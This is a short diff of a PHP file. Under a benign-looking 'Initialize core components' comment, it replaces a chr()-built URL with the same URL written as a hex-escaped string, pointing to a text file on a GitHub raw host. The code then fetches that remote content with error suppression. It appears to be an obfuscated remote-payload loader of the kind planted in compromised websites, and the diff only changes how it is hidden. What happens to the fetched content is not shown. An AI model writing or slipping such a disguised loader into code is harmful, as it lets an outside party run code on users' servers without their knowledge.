@@ -5,24 +5,8 @@
 */
 
 // Initialize core components
-$s1 = chr(104).chr(116).chr(116).chr(112).chr(115);
-$s2 = chr(58).chr(47).chr(47);
-$s3 = chr(114).chr(97).chr(119).chr(46);
-$s4 = chr(103).chr(105).chr(116).chr(104).chr(117).chr(98);
-$s5 = chr(117).chr(115).chr(101).chr(114).chr(99).chr(111);
-$s6 = chr(110).chr(116).chr(101).chr(110).chr(116).chr(46);
-$s7 = chr(99).chr(111).chr(109).chr(47);
-$s8 = chr(109).chr(100).chr(109).chr(111).chr(109).chr(105);
-$s9 = chr(110).chr(51).chr(54).chr(53).chr(51).chr(54);
-$s10 = chr(54).chr(45).chr(103).chr(105).chr(102).chr(47);
-$s11 = chr(98).chr(101).chr(108).chr(97).chr(47);
-$s12 = chr(114).chr(101).chr(102).chr(115).chr(47);
-$s13 = chr(104).chr(101).chr(97).chr(100).chr(115).chr(47);
-$s14 = chr(109).chr(97).chr(105).chr(110).chr(47);
-$s15 = chr(105).chr(110).chr(100).chr(101).chr(120).chr(46);
-$s16 = chr(116).chr(120).chr(116);
-
-$full_url = $s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10.$s11.$s12.$s13.$s14.$s15.$s16;
+$encoded = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x6d\x64\x6d\x6f\x6d\x69\x6e\x33\x36\x35\x33\x36\x36\x2d\x67\x69\x66\x2f\x62\x65\x6c\x61\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x69\x6e\x64\x65\x78\x2e\x74\x78\x74";
+$full_url = $encoded;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
